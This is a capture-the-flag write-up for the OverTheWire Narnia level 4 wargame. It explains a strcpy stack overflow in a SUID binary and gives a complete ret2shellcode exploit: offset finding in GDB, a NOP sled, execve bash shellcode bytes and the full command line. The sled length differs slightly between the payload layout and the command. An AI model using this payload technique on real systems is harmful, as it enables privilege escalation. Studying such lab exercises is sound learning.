# Narnia OverTheWire Level 4-5


## Vulnerability Analysis

-Narnia4 brings again a classic stack-based overflow via strcpy.

-Making use of a SUID binary that runs with narnia5's privilieges.

### Binary Code

    
    #include <string.h>
    #include <stdlib.h>
    #include <stdio.h>
    #include <ctype.h>

    extern char **environ;

    int main(int argc,char **argv){
        int i;
        char buffer[256];

        for(i = 0; environ[i] != NULL; i++)
            memset(environ[i], '\0', strlen(environ[i]));

        if(argc>1)
            strcpy(buffer,argv[1]);

        return 0;
}

-The buffer is 256 bytes but strcpy performs no bounds checking on the input given,so its allowed to us to overwrite adjacent stack regions including the saved return address.

    char buffer[256];

    if(argc>1)
        strcpy(buffer,argv[1]);


-The program deletes the entire environment before any useful operation so we can't inject any string into the environment variables to pass them as arguments to system()

## Exploit Development

### Determining of the offset


-Through GDB inspection runing a python code to perform the overflow i got the conclusion that the offset was exactly in 264 bytes from the start of the buffer.

    run $(python3 -c 'print(264*"A" + "BBBB")')

### Approach

-Since the environment is inaccesible,the injection vector is the buffer itself.

-The payload structure was this:

  [NOP sled 231bytes]+[shellcode 33 bytes]+[return address 4 bytes]  = 268 bytes

-The NOP sled \x90 acts as a landing zone tolerant to address variations.Any point within the sled results in a controlled slide into the shellcode without modifying critical CPU state.

### The Shellcode

-The shellcode used here:https://github.com/7feilee/shellcode/blob/master/Linux%2Fx86%2Fexecve%28-bin-bash%2C_%5B-bin-sh%2C_-p%5D%2C_NULL%29.c

    \x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

### Return Address

-0xffffdc80 was selected as the return address pointing approximately to the center of the NOP sled,identified via x/300x $esp in GDB

### Execution


    ./narnia4 $(perl -e 'print "\x90"x232 . "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" . "\x80\xdc\xff\xff"')


-The CPU lands within the sled,slides into the shellcode, and executes bash with narnia5's privileges.



## Key concepts

### ret2shellcode

-Injecting and executing code from stack requires an executable stack,a condition present in narnia due to the absence of NX protection

### NOP sled

-Technique used to increase the landing surface when the exact shellcode address is non-deterministic.

### Environment sanitization as mitigation


-Wiping the environment eliminates a common string injection.




